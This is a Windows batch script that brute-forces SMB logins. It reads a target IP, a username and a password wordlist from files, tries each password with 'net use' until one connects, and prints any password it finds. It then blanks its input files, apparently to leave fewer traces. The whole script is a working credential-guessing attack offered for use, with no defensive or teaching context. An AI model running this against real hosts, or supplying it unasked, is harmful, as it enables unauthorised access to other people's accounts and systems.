@echo off
setlocal enabledelayedexpansion

echo.

set ipaddr_file=ipaddr.txt
set user_file=user.txt
set wordlist_file=passwords.txt

:: Ensure files exist
if not exist "%ipaddr_file%" echo IP address file not found & exit /b
if not exist "%user_file%" echo User file not found & exit /b
if not exist "%wordlist_file%" echo Password file not found & exit /b

:: Read IP and user from file
set /p ip=<%ipaddr_file%
set /p user=<%user_file%

set /a count=1
for /f %%a in (%wordlist_file%) do (
  set pass=%%a
  echo [ATTEMPT !count!] [!pass!]
  net use \\!ip! /user:!user! !pass! >nul 2>&1
  if !errorlevel! EQU 0 goto success
  set /a count+=1
)

echo Password not found :(
echo. > ipaddr.txt
echo. > user.txt
echo. > passwords.txt
pause
exit

:success
echo.
echo Password Found: !pass!
net use \\!ip! /d /y >nul 2>&1
echo. > ipaddr.txt
echo. > user.txt
echo. > passwords.txt
pause
exit
